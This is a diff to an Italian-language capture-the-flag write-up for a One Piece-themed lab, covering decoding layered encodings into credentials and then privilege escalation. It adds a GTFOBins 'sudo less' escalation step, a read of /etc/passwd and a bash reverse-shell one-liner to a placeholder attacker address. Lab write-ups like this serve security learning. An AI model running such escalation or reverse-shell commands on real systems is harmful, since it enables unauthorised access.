@@ -128,6 +128,11 @@ _____________________
    
 ![11](https://github.com/Manganaccio/Manganaccio/assets/137283468/fa70a747-d1ec-43f3-b00d-25c55084c3b0)
 
+![12](https://github.com/Manganaccio/Manganaccio/assets/137283468/7f2bdfee-24b8-49cf-a131-5d7fdfc59d70)
+
+![13](https://github.com/Manganaccio/Manganaccio/assets/137283468/cb0cdcd0-78fb-4405-9149-94e5d79a9916)
+
+
 - una volta inserite le credenziali otteniamo il codice del terzo Poneglyph ed un'informazione che all'apparenza potrebbe trarci in inganno non specificando la prossima destinazione, ma in fondo la CTF in questione        tratta di pirati quindi sono loro che vogliono ingannarci :)
 - visitiamo la pagina _unspecified_ fornita dall'indizio di Kaido e troviamo così la quarta ed ultima parte del Poneglyph da decifrare
 - decifriamo il lungo codice usando in ordine: Base32, codice morse, binary, hex, Base58 e Base64 ed otteniamo le credenziali di accesso che ci permettono di rispondere alla sesta domanda
@@ -185,6 +190,15 @@ Now, he needs to find the One Piece._
 - sudo -l
  
 ![17](https://github.com/Manganaccio/Manganaccio/assets/137283468/19861279-c743-4ac5-871c-e5b4ef6b155e)
+
+- riprendendo GTFOBins nella sezione _less_ cerchiamo il comando da digitare per diventare root sotto la voce SUDO
+- sudo less /etc/profile
+
+![18](https://github.com/Manganaccio/Manganaccio/assets/137283468/c1866bae-e6e6-40d5-a116-c299180950ad)
+
+- sembra un altro vicolo cieco, per ottenere i privilegi necessari a diventare root bisogna modificare il file _less_
+- lanciando il comando _cat /etc/passwd_ possiamo notare che l'utente root ha la shell di default _bin/bash_
+- possiamo ora sfruttare il comando bash -i >& /dev/tcp/IP-ATT/4443 0>&1
 
 
     
